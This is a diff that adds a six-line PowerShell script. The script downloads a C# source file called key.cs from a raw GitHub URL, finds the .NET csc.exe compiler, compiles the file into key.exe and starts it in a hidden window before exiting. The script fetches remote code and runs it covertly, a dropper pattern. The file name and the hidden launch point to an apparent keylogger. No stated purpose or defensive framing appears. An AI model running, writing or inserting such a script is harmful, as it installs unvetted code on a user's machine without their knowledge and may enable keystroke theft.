@@ -1,0 +1,6 @@
+curl https://raw.githubusercontent.com/MischaPrinc/src/refs/heads/main/key.cs -o key.cs
+$csc = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64" -Filter csc.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
+& $csc /out:key.exe key.cs
+Start-Process -FilePath "$PWD\key.exe" -WindowStyle hidden
+exit
+
